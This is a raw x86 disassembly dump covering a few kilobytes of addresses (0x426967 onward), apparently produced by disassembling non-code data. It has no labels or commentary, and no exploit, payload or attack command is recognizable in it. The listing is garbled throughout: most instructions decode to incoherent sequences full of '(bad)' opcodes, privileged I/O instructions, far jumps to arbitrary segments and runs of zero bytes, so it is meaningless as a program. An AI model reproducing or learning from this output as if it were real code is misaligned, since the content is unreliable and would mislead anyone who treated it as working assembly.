  426967:	sbb    BYTE PTR [edi-0x6d],ch
  42696a:	inc    esi
  42696b:	xchg   esp,eax
  42696c:	push   ss
  42696d:	and    eax,DWORD PTR [eax]
	...
  4269d3:	add    BYTE PTR [eax],al
  4269d5:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  4269dc:	mov    edi,?
  4269de:	sub    ebp,esp
  4269e0:	lahf   
  4269e1:	mov    esi,DWORD PTR [edx]
  4269e3:	push   ecx
  4269e4:	and    BYTE PTR [ebx],ch
  4269e6:	addr16 sahf 
  4269e8:	add    DWORD PTR [eax],eax
  4269ea:	add    BYTE PTR [ecx],al
  4269ec:	add    BYTE PTR [eax],al
  4269ee:	and    bl,BYTE PTR [edi-0x6b]
  4269f1:	push   edx
  4269f2:	lods   al,BYTE PTR ds:[esi]
  4269f3:	gs (bad) 
  4269f5:	xor    eax,edi
  4269f7:	jmp    0x426a62
  4269f9:	and    eax,0xf8d5e9af
  4269fe:	push   ebx
  4269ff:	xor    al,BYTE PTR [edi]
  426a01:	mov    ds:0x821a5462,eax
  426a06:	dec    edi
  426a07:	mov    eax,ds:0xbefb388
  426a0c:	loop   0x4269cf
  426a0e:	(bad)  
  426a0f:	jg     0x426a5e
  426a11:	popa   
  426a12:	mov    eax,0xac9eb264
  426a17:	retf   0x1b1e
  426a1a:	mov    esp,0x1d2ffb91
  426a1f:	or     DWORD PTR [ebx],esi
  426a21:	cmp    esp,ebp
  426a23:	in     eax,dx
  426a24:	popf   
  426a25:	test   DWORD PTR [esi-0x271c7f2d],0x2baa38e8
  426a2f:	and    DWORD PTR [eax],0x9ac32aa1
  426a35:	loope  0x426a17
  426a37:	dec    ecx
  426a38:	inc    ebx
  426a39:	pop    edx
  426a3a:	mov    ds:0xa57ec8e3,al
  426a3f:	push   esp
  426a40:	or     edx,esp
  426a42:	retf   
  426a43:	jae    0x426a6a
  426a45:	rcl    BYTE PTR [esi+esi*4-0x6911f46d],cl
  426a4c:	leave  
  426a4d:	fist   DWORD PTR [esi+0x3b]
  426a50:	and    al,0x18
  426a52:	sbb    cl,cl
  426a54:	mov    DWORD PTR [esi+0x7ae8d8ee],edi
  426a5a:	lods   al,BYTE PTR ds:[esi]
  426a5b:	stos   DWORD PTR es:[edi],eax
  426a5c:	xchg   ebx,eax
  426a5d:	ret    
  426a5e:	sar    BYTE PTR [ebx-0x3031cfbd],0x37
  426a65:	data16 fimul DWORD PTR [edx+0x66]
  426a69:	sub    al,0xf7
  426a6b:	jnp    0x426a73
  426a6d:	pop    eax
  426a6e:	xor    edi,edx
  426a70:	mov    ah,BYTE PTR [ecx-0x2c]
  426a73:	fidivr DWORD PTR [edx+0x6e0f0150]
  426a79:	sub    BYTE PTR [eax],dl
  426a7b:	scas   al,BYTE PTR es:[edi]
  426a7c:	inc    esi
  426a7d:	sbb    BYTE PTR [ecx+esi*8],ah
  426a80:	and    DWORD PTR [edi],eax
  426a82:	pushf  
  426a83:	sahf   
  426a84:	xchg   ebx,eax
  426a85:	mov    esi,0x914061d0
  426a8a:	out    dx,eax
  426a8b:	fwait
  426a8c:	ss cmp edx,esp
  426a8f:	sub    al,0x2a
  426a91:	mov    esp,0xdec76859
  426a96:	xor    eax,DWORD PTR [edi+0x2f]
  426a99:	xor    DWORD PTR [ebp+ecx*4-0x9],0x86e1b4b1
  426aa1:	jl     0x426ad8
  426aa3:	mov    ds:0x41a16de0,al
  426aa8:	push   0x82fb5186
  426aad:	cmp    al,0xff
  426aaf:	add    DWORD PTR [ecx+edi*2],edx
  426ab2:	outs   dx,BYTE PTR ds:[esi]
  426ab3:	stos   BYTE PTR es:[edi],al
  426ab4:	(bad)  
  426ab6:	push   ebp
  426ab7:	xor    BYTE PTR [edx+eax*4-0x3e998e3d],al
  426abe:	mov    bh,bh
  426ac0:	loop   0x426aac
  426ac2:	adc    BYTE PTR [edx-0x2723b84b],0x9a
  426ac9:	js     0x426b27
  426acb:	outs   dx,DWORD PTR ds:[esi]
  426acc:	push   esi
  426acd:	dec    edi
  426ace:	xchg   edx,eax
  426acf:	or     bl,BYTE PTR [edx-0x52bb7b1]
  426ad5:	rcl    bl,1
  426ad7:	scas   eax,DWORD PTR es:[edi]
  426ad8:	and    DWORD PTR [ecx+ebx*1-0xf132d83],edx
  426adf:	lods   eax,DWORD PTR ds:[esi]
  426ae0:	imul   BYTE PTR [ecx+0x43]
  426ae3:	inc    ebx
  426ae4:	lahf   
  426ae5:	je     0x426b0f
  426ae7:	js     0x426b1f
  426ae9:	rol    BYTE PTR [edx+0x3f],1
  426aec:	cwde   
  426aed:	jecxz  0x426aef
	...
  426b53:	add    BYTE PTR [eax],al
  426b55:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426b5b:	ja     0x426b38
  426b5d:	out    dx,eax
  426b5e:	inc    esi
  426b5f:	sub    DWORD PTR [esi],edi
  426b61:	or     al,0xdb
  426b63:	dec    eax
  426b64:	std    
  426b65:	imul   esp,DWORD PTR [edi-0x61],0x1
  426b69:	add    BYTE PTR [eax],al
  426b6b:	add    DWORD PTR [eax],eax
  426b6d:	add    BYTE PTR [esi],dh
  426b6f:	mov    dh,0x2
  426b71:	pop    ebp
  426b72:	das    
  426b73:	fmul   DWORD PTR [eax+edx*4]
  426b76:	jno    0x426bdc
  426b78:	enter  0xe0b,0x7d
  426b7c:	jg     0x426bfd
  426b7e:	pop    ss
  426b7f:	inc    ecx
  426b80:	inc    esp
  426b81:	cld    
  426b82:	jb     0x426bae
  426b84:	call   0x9fbf:0x7f83998
  426b8b:	push   cs
  426b8c:	ret    0x7c3
  426b8f:	dec    esi
  426b90:	enter  0xe848,0xf1
  426b94:	xor    al,0x0
  426b96:	rcr    DWORD PTR cs:[ebx-0x14],1
  426b9a:	adc    al,0xea
  426b9c:	imul   ebx,DWORD PTR [eax+esi*4+0x5d],0xfce089f3
  426ba4:	mov    ds:0x21ba86cb,al
  426ba9:	cmp    eax,0x78f88f27
  426bae:	xchg   ecx,eax
  426baf:	mov    bl,0xe3
  426bb1:	jnp    0x426c06
  426bb3:	fild   QWORD PTR [edx+0x66]
  426bb6:	sub    DWORD PTR [esi+0x37],esp
  426bb9:	and    DWORD PTR [eax-0x4c],ebp
  426bbc:	scas   eax,DWORD PTR es:[edi]
  426bbd:	push   0x76ecb2d9
  426bc2:	pusha  
  426bc3:	mov    ah,0x12
  426bc5:	inc    ebp
  426bc6:	fisub  DWORD PTR [ecx+edx*8]
  426bc9:	mov    ds:0xa14f9302,al
  426bce:	fdivr  QWORD PTR cs:[edi-0x67]
  426bd2:	std    
  426bd3:	mov    WORD PTR [edx],fs
  426bd5:	icebp  
  426bd6:	lods   eax,DWORD PTR ds:[esi]
  426bd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bd8:	add    BYTE PTR [edx-0x140fd46e],ch
  426bde:	pop    ds
  426bdf:	cmp    al,0x27
  426be1:	test   eax,0x9abfd98f
  426be6:	fidivr WORD PTR ds:0x9615fd1d
  426bec:	mov    bh,0xd5
  426bee:	inc    ecx
  426bef:	ins    BYTE PTR es:[edi],dx
  426bf0:	pop    es
  426bf1:	ds or  edi,ebp
  426bf4:	jb     0x426c15
  426bf6:	xchg   esp,eax
  426bf7:	xchg   ebx,eax
  426bf8:	mov    ds:0xf48fcbc6,al
  426bfd:	cmp    al,0xec
  426bff:	adc    dl,bh
  426c01:	or     al,0xb0
  426c03:	xchg   DWORD PTR [ecx-0x20],esp
  426c06:	leave  
  426c07:	out    0x39,al
  426c09:	ret    
  426c0a:	and    esp,ecx
  426c0c:	lods   eax,DWORD PTR ds:[esi]
  426c0d:	aad    0xae
  426c0f:	pop    ebp
  426c10:	cwde   
  426c11:	or     bh,ah
  426c13:	lods   eax,DWORD PTR ds:[esi]
  426c14:	sbb    dh,BYTE PTR [ebx+0x4b872eb0]
  426c1a:	dec    esi
  426c1b:	cld    
  426c1c:	ja     0x426be9
  426c1e:	cmovg  ebx,DWORD PTR [edx-0x4c2afebc]
  426c25:	jmp    0x426bae
  426c27:	inc    edi
  426c28:	and    bh,dh
  426c2a:	adc    al,0xac
  426c2c:	jbe    0x426bb6
  426c2e:	add    esp,DWORD PTR [ebx-0x11385d0b]
  426c34:	cmp    al,0x6
  426c36:	loop   0x426c78
  426c38:	call   0xf328:0xce5404b0
  426c3f:	stos   BYTE PTR es:[edi],al
  426c40:	fldenv [edx+ebx*8+0x64f2b782]
  426c47:	lods   al,BYTE PTR ds:[esi]
  426c48:	cmp    al,0x81
  426c4a:	nop
  426c4b:	loopne 0x426c92
  426c4d:	jo     0x426c96
  426c4f:	fdiv   DWORD PTR [esi]
  426c51:	push   es
  426c52:	test   DWORD PTR [edx+0x7aa097a9],0x1065c741
  426c5c:	mov    ?,WORD PTR [edx+eax*4+0x24]
  426c60:	bnd jl 0x426c5f
  426c63:	push   esp
  426c64:	aas    
  426c65:	dec    ecx
  426c66:	or     eax,0x83e3d15c
  426c6b:	retf   0xdfe6
	...
  426cd6:	loop   0x426d38
  426cd8:	test   DWORD PTR [esi+0x74f3f787],esi
  426cde:	mov    ah,0xeb
  426ce0:	cld    
  426ce1:	mov    edx,0xac8148bc
  426ce6:	addr16 mov al,ds:0x1
  426cea:	add    BYTE PTR [ecx],al
  426cec:	add    BYTE PTR [eax],al
  426cee:	iret   
  426cef:	bound  esi,QWORD PTR [ecx]
  426cf1:	leave  
  426cf2:	cmp    eax,0xc2663649
  426cf7:	int    0xda
  426cf9:	and    eax,0x81bb174e
  426cfe:	stos   BYTE PTR es:[edi],al
  426cff:	das    
  426d00:	xchg   BYTE PTR [eax+0x6e938d81],ch
  426d06:	pop    edx
  426d07:	shl    BYTE PTR [eax+0x22],1
  426d0a:	mov    BYTE PTR [esp+ebx*1],dl
  426d0d:	test   DWORD PTR [edx+0x31],0x1b7418c9
  426d14:	xor    esi,ebp
  426d16:	mov    ecx,0xd5a34212
  426d1b:	pop    eax
  426d1c:	push   ecx
  426d1d:	lds    ebx,FWORD PTR [ebx-0xa1265e4]
  426d23:	in     eax,dx
  426d24:	dec    esi
  426d25:	call   0xf18f2e62
  426d2a:	repz add BYTE PTR [ecx-0x45e6f5bc],dh
  426d31:	shl    DWORD PTR [edx+0x8e5dca5],0x22
  426d38:	pop    ds
  426d39:	cmp    al,0xd3
  426d3b:	pushf  
  426d3c:	mov    dh,cl
  426d3e:	mov    esi,0xa1923da9
  426d43:	mov    ebp,0xf4861641
  426d48:	jmp    0x5171ac31
  426d4d:	in     al,dx
  426d4e:	rcr    BYTE PTR [ebp-0x6],1
  426d51:	popa   
  426d52:	push   0xffffff9e
  426d54:	jge    0x426cfd
  426d56:	pop    esi
  426d57:	jmp    0x426d0f
  426d59:	mov    ecx,ebx
  426d5b:	loop   0x426db7
  426d5d:	rcl    BYTE PTR [ebp-0x4f],cl
  426d60:	xchg   ebx,eax
  426d61:	pop    ss
  426d62:	mov    edx,0x4dbd5cdb
  426d67:	push   eax
  426d68:	lock in eax,0x8d
  426d6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d6c:	xchg   esi,eax
  426d6d:	fwait
  426d6e:	inc    ebp
  426d6f:	and    al,0xfe
  426d71:	push   ebp
  426d72:	sbb    al,0x3f
  426d74:	pop    edi
  426d75:	pop    edx
  426d76:	mov    eax,0xb7402c37
  426d7b:	gs mov esp,edi
  426d7e:	mov    ds:0x3aa5eef,eax
  426d83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d84:	xchg   BYTE PTR [ecx-0x5efc782b],cl
  426d8a:	bound  esi,QWORD PTR ds:0xd6db80ad
  426d90:	xchg   ebx,eax
  426d91:	mov    edi,0xec9e41a8
  426d96:	outs   dx,DWORD PTR ds:[esi]
  426d97:	sbb    eax,DWORD PTR [edi]
  426d99:	xchg   BYTE PTR [eax-0x60a67aa],ah
  426d9f:	cld    
  426da0:	and    edi,DWORD PTR [eax+0x5ffd19a]
  426da6:	dec    edi
  426da7:	outs   dx,DWORD PTR ds:[esi]
  426da8:	int3   
  426da9:	xchg   dh,ch
  426dab:	test   al,0x90
  426dad:	xor    ecx,ecx
  426daf:	test   edi,eax
  426db1:	jno    0x426deb
  426db3:	into   
  426db4:	jmp    0x426e23
  426db6:	push   esp
  426db7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426db8:	sbb    BYTE PTR [eax+0x4f],dl
  426dbb:	ins    DWORD PTR es:[edi],dx
  426dbc:	jecxz  0x426d58
  426dbe:	mov    dl,0xef
  426dc0:	outs   dx,BYTE PTR ds:[esi]
  426dc1:	fdivr  DWORD PTR [esi]
  426dc3:	imul   bh
  426dc5:	ficomp DWORD PTR [eax]
  426dc7:	imul   esp,DWORD PTR [ecx],0x8239c558
  426dcd:	hlt    
  426dce:	ret    0x36a0
  426dd1:	mov    ds:0xb5a2c3d4,eax
  426dd6:	cmc    
  426dd7:	sbb    BYTE PTR [eax+0x4e],bl
  426dda:	popf   
  426ddb:	adc    DWORD PTR [eax],esp
  426ddd:	or     cl,BYTE PTR [eax-0x74]
  426de0:	adc    edi,edi
  426de2:	fidiv  WORD PTR [edi-0x589d4e96]
  426de8:	mov    ah,0x15
  426dea:	lods   eax,DWORD PTR ds:[esi]
  426deb:	add    eax,DWORD PTR [edx+ebp*1]
	...
  426e56:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426e5c:	call   0x540c:0xc7c2ecf9
  426e63:	aaa    
  426e64:	mov    al,0x35
  426e66:	addr16 mov eax,ds:0x1
  426e6a:	add    BYTE PTR [ecx],al
  426e6c:	add    BYTE PTR [eax],al
  426e6e:	mov    dl,0x4b
  426e70:	sub    al,0xc3
  426e72:	dec    edi
  426e73:	or     edx,esp
  426e75:	pushf  
  426e76:	jo     0x426e1b
  426e78:	jne    0x426e7c
  426e7a:	(bad)  
  426e7b:	dec    ecx
  426e7c:	or     DWORD PTR [edi],edi
  426e7e:	mov    WORD PTR [esi+0x69f2bad0],cs
  426e84:	scas   al,BYTE PTR es:[edi]
  426e85:	sahf   
  426e86:	(bad)  [esi]
  426e88:	test   eax,0x90e1e687
  426e8d:	and    DWORD PTR [ebp+0x6c],0x5b
  426e91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e92:	push   esp
  426e93:	adc    DWORD PTR [ebx+0x2b1500ec],eax
  426e99:	fsubr  DWORD PTR [eax]
  426e9b:	adc    eax,0x7758b08f
  426ea0:	adc    DWORD PTR [esi-0x56],0xffffff8f
  426ea4:	leave  
  426ea5:	lock sub ebp,DWORD PTR [edi+0x47]
  426ea9:	fst    QWORD PTR [edi+0x37ec822e]
  426eaf:	cmp    cl,dh
  426eb1:	scas   al,BYTE PTR es:[edi]
  426eb2:	out    dx,al
  426eb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426eb4:	jo     0x426ef5
  426eb6:	bound  esi,QWORD PTR fs:[edx]
  426eb9:	daa    
  426eba:	xchg   ebx,edx
  426ebc:	inc    eax
  426ebd:	ins    BYTE PTR es:[edi],dx
  426ebe:	fwait
  426ebf:	out    dx,al
  426ec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ec1:	(bad)
  426ec4:	scas   eax,DWORD PTR es:[edi]
  426ec5:	push   ebx
  426ec6:	imul   esi,ebp,0x7bb1790b
  426ecc:	sahf   
  426ecd:	or     al,0x2
  426ecf:	imul   ecx,DWORD PTR [edi],0xffffffae
  426ed2:	mov    esi,0xbdc6f99
  426ed7:	push   edi
  426ed8:	inc    esi
  426ed9:	hlt    
  426eda:	mov    esp,0xd37b6043
  426edf:	shl    BYTE PTR [ebx],1
  426ee1:	shl    BYTE PTR [edx+0x58ea290a],1
  426ee7:	or     BYTE PTR [ebp-0x67],0x2d
  426eeb:	sub    DWORD PTR [edi],ecx
  426eed:	movsx  esp,cl
  426ef0:	mov    ds:0xf902e35,al
  426ef5:	arpl   bx,dx
  426ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ef8:	std    
  426ef9:	jb     0x426f72
  426efb:	outs   dx,DWORD PTR ds:[esi]
  426efc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426efd:	cld    
  426efe:	mov    bh,0xdb
  426f00:	mov    bl,0x6b
  426f02:	rcr    DWORD PTR [esi],1
  426f04:	or     DWORD PTR [esi],ebp
  426f06:	push   ebx
  426f07:	mov    eax,0xa041d521
  426f0c:	das    
  426f0d:	xor    bh,dl
  426f0f:	stos   DWORD PTR es:[edi],eax
  426f10:	lock add eax,0x3a22f299
  426f16:	hlt    
  426f17:	push   ebp
  426f18:	dec    ecx
  426f19:	pop    ss
  426f1a:	rol    BYTE PTR [eax+0x70f81c65],0x6
  426f21:	dec    ebp
  426f22:	add    BYTE PTR [ebx],0x6c
  426f25:	xchg   esp,eax
  426f26:	sbb    dl,ch
  426f28:	cdq    
  426f29:	jmp    0xfadc0ce6
  426f2e:	arpl   WORD PTR [edi-0x1e3d6569],bx
  426f34:	rcr    BYTE PTR [eax],cl
  426f36:	mov    eax,ds:0xdf6e27f0
  426f3b:	xchg   esi,eax
  426f3c:	or     eax,esp
  426f3e:	(bad)  
  426f40:	dec    eax
  426f41:	add    DWORD PTR [eax],edi
  426f43:	(bad)  
  426f44:	jmp    0x426f01
  426f46:	test   al,0x69
  426f48:	mov    dl,0x3
  426f4a:	pop    eax
  426f4b:	popf   
  426f4c:	sub    al,0xba
  426f4e:	neg    DWORD PTR [esp+edx*4]
  426f51:	rcl    dl,1
  426f53:	and    BYTE PTR [esi-0x62],dl
  426f56:	cs pop esp
  426f58:	push   edx
  426f59:	icebp  
  426f5a:	and    eax,0x88b6744d
  426f5f:	leave  
  426f60:	retf   0xa012
  426f63:	mov    BYTE PTR [ecx+0x22e9a680],0x85
  426f6a:	pop    esi
  426f6b:	fnstcw WORD PTR [ebp+0x0]
	...
  426fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fd7:	mov    ds:0xf5c7f1c7,al
  426fdc:	mov    dh,0xf7
  426fde:	inc    edi
  426fdf:	inc    ecx
  426fe0:	add    DWORD PTR [edi+edi*4+0x67706c04],esp
  426fe7:	mov    ds:0x1000001,al
  426fec:	add    BYTE PTR [eax],al
  426fee:	add    ah,al
  426ff0:	mov    ebx,0x9fce570
  426ff5:	add    DWORD PTR [edx],eax
  426ff7:	cli    
  426ff8:	int3   
  426ff9:	add    eax,0x4238b824
  426ffe:	fbld   TBYTE PTR [edi+0x37f38002]
  427004:	mov    gs,WORD PTR [ebp-0xd]
  427007:	mov    ebp,DWORD PTR ds:0x9326d431
  42700d:	push   ebp
  42700e:	mov    dh,0xcf
  427010:	ss jmp 0x31307d50
  427016:	lods   eax,DWORD PTR ds:[esi]
  427017:	aad    0x4f
  427019:	lods   al,BYTE PTR ds:[esi]
  42701a:	xor    esp,esp
  42701c:	ja     0x426fd6
  42701e:	pusha  
  42701f:	and    DWORD PTR [ecx+0x41],edi
  427022:	test   eax,0x2ec46232
  427027:	fld    TBYTE PTR [esi-0x62a4b45b]
  42702d:	pop    eax
  42702e:	or     BYTE PTR [edi+0x7336c185],0x63
  427035:	mov    DWORD PTR [ebx],esp
  427037:	cwde   
  427038:	mov    ebp,0xdd48aeb0
  42703d:	mov    ds:0x8a503843,al
  427042:	xor    al,0x9d
  427044:	ss push edx
  427046:	aam    0xdc
  427048:	jl     0x42701c
  42704a:	pop    edx
  42704b:	sub    ch,BYTE PTR [edx]
  42704d:	out    dx,al
  42704e:	push   ds
  42704f:	xchg   ecx,eax
  427050:	lea    eax,[ebx+0x3ffcaf29]
  427056:	sahf   
  427057:	nop
  427058:	data16 (bad) 
  42705a:	xchg   edi,eax
  42705b:	xchg   ebp,eax
  42705c:	dec    ebx
  42705d:	xor    DWORD PTR [edx],eax
  42705f:	shl    DWORD PTR [ebx-0x48],1
  427062:	arpl   WORD PTR [edi+ecx*8-0x5d275eb1],bx
  427069:	fnstcw WORD PTR [ebx]
  42706b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42706c:	arpl   WORD PTR [edi+0x4c8070b6],cx
  427072:	push   0x38208729
  427077:	lahf   
  427078:	jl     0x4270e3
  42707a:	sti    
  42707b:	xor    eax,0xd77d7fc6
  427080:	scas   al,BYTE PTR es:[edi]
  427081:	push   ebx
  427082:	inc    ebx
  427083:	jle    0x42705e
  427085:	outs   dx,BYTE PTR ds:[esi]
  427086:	mov    ecx,0x9878ef08
  42708b:	sbb    al,0x7c
  42708d:	xchg   BYTE PTR [edi],ah
  42708f:	jmp    0x97302b58
  427094:	inc    ecx
  427095:	pop    ss
  427096:	adc    esp,DWORD PTR [edi+ecx*1+0x43d71126]
  42709d:	(bad)  [ebx-0x7c6ccb58]
  4270a3:	test   BYTE PTR [edi],0x59
  4270a6:	mov    esi,esi
  4270a8:	mov    edi,DWORD PTR [ecx-0x6c]
  4270ab:	jae    0x427030
  4270ad:	mov    cl,0xa5
  4270af:	fmulp  st(7),st
  4270b1:	xchg   edi,eax
  4270b2:	fiadd  WORD PTR [eax]
  4270b4:	daa    
  4270b5:	pop    ecx
  4270b6:	mov    edi,0xfe5cd03c
  4270bb:	inc    DWORD PTR [edi-0x1f0e8ad6]
  4270c1:	mov    ah,0x32
  4270c3:	mov    ebp,ss
  4270c5:	fistp  QWORD PTR [ebp-0x68070baa]
  4270cb:	iret   
  4270cc:	imul   eax,ecx,0x1e
  4270cf:	fmul   st(0),st
  4270d1:	aad    0xf3
  4270d3:	mov    gs,WORD PTR [edx+0x6c]
  4270d6:	pop    edi
  4270d7:	imul   ebx,DWORD PTR [ecx-0x7b],0xffffff87
  4270db:	sub    al,0xb5
  4270dd:	cwde   
  4270de:	sbb    DWORD PTR [edx],ebx
  4270e0:	jp     0x4270d2
  4270e2:	xor    ah,bl
  4270e4:	cmp    DWORD PTR [edi+0x2b210640],edi
  4270ea:	pop    es
  4270eb:	cmp    eax,0xcbdc
	...
  427154:	add    BYTE PTR [eax],al
  427156:	or     al,0x6d
  427158:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42715e:	inc    esp
  42715f:	mov    ebp,0x4c3b9d96
  427164:	setb   BYTE PTR [edi-0x5d]
  427168:	add    DWORD PTR [eax],eax
  42716a:	add    BYTE PTR [ecx],al
  42716c:	add    BYTE PTR [eax],al
  42716e:	je     0x4270f6
  427170:	push   cs
  427171:	mov    ebp,0xbd397d72
  427176:	(bad)  
  427177:	mov    ebp,0x1322d506
  42717c:	(bad)  
  42717d:	in     eax,0x3a
  42717f:	xor    BYTE PTR [eax-0x65525114],ch
  427185:	push   esi
  427186:	loope  0x4271c7
  427188:	push   esi
  427189:	push   0x41bbdf5c
  42718e:	dec    ebx
  42718f:	push   esi
  427190:	stc    
  427191:	xchg   bx,ax
  427193:	es mov ch,0x8
  427196:	jmp    0x5dd0:0x6ba33acd
  42719d:	sbb    DWORD PTR [esp+edi*8-0x2c6e4e4],0xd1591369
  4271a8:	test   al,0xa1
  4271aa:	clc    
  4271ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271ac:	pop    esp
  4271ad:	daa    
  4271ae:	jmp    0x4271a8
  4271b0:	or     ebx,DWORD PTR [eax]
  4271b2:	into   
  4271b3:	mov    cl,0xa1
  4271b5:	add    DWORD PTR [esi-0x2a91e7cf],0xe8eea51d
  4271bf:	aad    0x93
  4271c1:	inc    edx
  4271c2:	or     eax,0x10607f46
  4271c7:	mov    al,ds:0xc6bffdc
  4271cc:	je     0x42722a
  4271ce:	aad    0x3f
  4271d0:	add    DWORD PTR [ebx+ebx*1],ebp
  4271d3:	sbb    edi,DWORD PTR [ebx+0x396c1120]
  4271d9:	(bad)  
  4271da:	stc    
  4271db:	cld    
  4271dc:	ja     0x4271b4
  4271de:	ret    
  4271df:	imul   ebp,esi,0x67
  4271e2:	sti    
  4271e3:	dec    esp
  4271e4:	gs nop
  4271e6:	clc    
  4271e7:	pop    edi
  4271e8:	xchg   BYTE PTR [esi],ah
  4271ea:	js     0x4271a5
  4271ec:	sti    
  4271ed:	push   cs
  4271ee:	cmp    DWORD PTR [esi+edx*2+0x42],edx
  4271f2:	pop    esi
  4271f3:	aad    0x74
  4271f5:	mov    edi,0x262ffff7
  4271fa:	jge    0x4271e6
  4271fc:	ins    DWORD PTR es:[edi],dx
  4271fd:	dec    esp
  4271fe:	bound  eax,QWORD PTR [edx-0x3a]
  427201:	sbb    dh,BYTE PTR [ebx-0x19c65777]
  427207:	icebp  
  427208:	sub    esp,edx
  42720a:	dec    edx
  42720b:	imul   edi,DWORD PTR [eax],0x51
  42720e:	inc    ebp
  42720f:	adc    eax,0x94de346a
  427214:	les    eax,FWORD PTR [ecx]
  427216:	in     eax,dx
  427217:	test   BYTE PTR [edx+eax*8-0x48],bl
  42721b:	add    al,0xab
  42721d:	xor    BYTE PTR [esi+esi*2],bl
  427220:	repnz sub al,0x58
  427223:	push   edi
  427224:	clc    
  427225:	cli    
  427226:	mov    WORD PTR [ebp-0x7a16f550],fs
  42722c:	pop    ds
  42722d:	or     eax,0x148fe934
  427232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427233:	outs   dx,DWORD PTR ds:[esi]
  427234:	stos   DWORD PTR es:[edi],eax
  427235:	popa   
  427236:	add    BYTE PTR [ecx-0x13],al
  427239:	jnp    0x427271
  42723b:	sub    eax,0x4254599d
  427240:	xchg   edi,eax
  427241:	mov    esi,0xd863bfdb
  427246:	push   edx
  427247:	bound  esp,QWORD PTR [edi+0x2d]
  42724a:	cld    
  42724b:	xor    edi,DWORD PTR [edx]
  42724d:	xor    DWORD PTR [ebx-0x2cc4a641],eax
  427253:	jns    0x427200
  427255:	dec    esp
  427256:	call   0x322513bb
  42725b:	push   0x5e42cc6d
  427260:	sub    BYTE PTR [ebx+0x3234b359],bh
  427266:	mov    BYTE PTR es:[esi+0x29],ch
  42726a:	test   DWORD PTR [esi+0x54d2],edx
	...
  4272d4:	add    BYTE PTR [eax],al
  4272d6:	push   ds
  4272d7:	inc    ecx
  4272d8:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  4272df:	push   ecx
  4272e0:	dec    ebp
  4272e1:	mov    ds:0xd84046ef,al
  4272e6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4272e8:	add    DWORD PTR [eax],eax
  4272ea:	add    BYTE PTR [ecx],al
  4272ec:	add    BYTE PTR [eax],al
  4272ee:	daa    
  4272ef:	enter  0xfd1f,0xb2
  4272f3:	retf   0xa60d
  4272f6:	call   0xe172cfa5
  4272fb:	push   cs
  4272fc:	mov    esp,0x81221e19
  427301:	pop    eax
  427302:	and    edx,esi
  427304:	bound  esi,QWORD PTR [eax]
  427306:	jecxz  0x427288
  427308:	jl     0x427378
  42730a:	xchg   edx,eax
  42730b:	ret    
  42730c:	add    BYTE PTR [bp+0x36],cl
  427310:	repnz lea ebp,[ecx+0x1f]
  427314:	adc    eax,0x7d33990d
  427319:	jmp    0x10b3bc90
  42731e:	(bad)  [eax+esi*1+0x4e182b0b]
  427325:	in     al,0x3c
  427327:	outs   dx,BYTE PTR ds:[esi]
  427328:	pop    eax
  427329:	aaa    
  42732a:	push   0x39
  42732c:	imul   edx,DWORD PTR [edx],0x886e51a
  427332:	fs dec ebp
  427334:	mov    DWORD PTR [edi],edx
  427336:	xor    eax,0xf541a4e1
  42733b:	jns    0x42737c
  42733d:	ins    DWORD PTR es:[edi],dx
  42733e:	jns    0x42735e
  427340:	sub    DWORD PTR [edi+0x82b281f],ebp
  427346:	xchg   ebp,esi
  427348:	loopne 0x427319
  42734a:	mov    eax,0x69b3c99e
  42734f:	dec    esi
  427350:	stc    
  427351:	jg     0x4272d7
  427353:	xor    ch,BYTE PTR [edi-0x677b6054]
  427359:	mov    edi,0x82371b6a
  42735e:	aaa    
  42735f:	xchg   ebx,eax
  427360:	mov    bl,0x56
  427362:	lock loopne 0x427392
  427365:	mov    dl,0xe3
  427367:	xchg   ecx,eax
  427368:	inc    edi
  427369:	dec    edi
  42736a:	push   eax
  42736c:	test   BYTE PTR cs:[eax+ecx*1-0x16d4045d],bl
  427374:	lods   eax,DWORD PTR ds:[esi]
  427375:	adc    BYTE PTR [ebp+0x2a],ch
  427378:	rcl    DWORD PTR [ebx],cl
  42737a:	and    BYTE PTR [esi],dh
  42737c:	ret    0x7be
  42737f:	mov    al,0x4b
  427381:	sbb    edi,DWORD PTR [edi+0x3]
  427384:	jmp    0x6cab:0x7903ee86
  42738b:	push   esp
  42738c:	jo     0x42736a
  42738e:	xor    eax,0xe6db642d
  427393:	jl     0x42733e
  427395:	cli    
  427396:	push   esp
  427397:	sub    eax,0xe42bbc60
  42739c:	sbb    DWORD PTR ds:0xeca15cd8,esi
  4273a2:	fisttp QWORD PTR [ebx]
  4273a4:	rcl    DWORD PTR [eiz*8+0x335be855],cl
  4273ab:	lods   al,BYTE PTR ds:[esi]
  4273ac:	pop    ds
  4273ad:	push   esi
  4273ae:	pop    es
  4273af:	loopne 0x427339
  4273b1:	mov    ecx,DWORD PTR [eax-0x378f3c77]
  4273b7:	xchg   DWORD PTR [ebx*1+0x695ea4e5],ecx
  4273be:	pop    ss
  4273bf:	addr16 pop ds
  4273c1:	xchg   ecx,eax
  4273c2:	call   0xa708:0x7a62978b
  4273c9:	inc    esp
  4273ca:	rcr    bh,0xc6
  4273cd:	sub    BYTE PTR [edx+0x6a18e120],ah
  4273d3:	mov    bl,0xc5
  4273d5:	ds mov esi,0xf66162c9
  4273db:	cmc    
  4273dc:	lds    eax,FWORD PTR [ecx-0x3]
  4273df:	cli    
  4273e0:	push   ecx
  4273e1:	ss sti 
  4273e3:	jg     0x4273c6
  4273e5:	inc    ecx
  4273e6:	adc    al,0x65
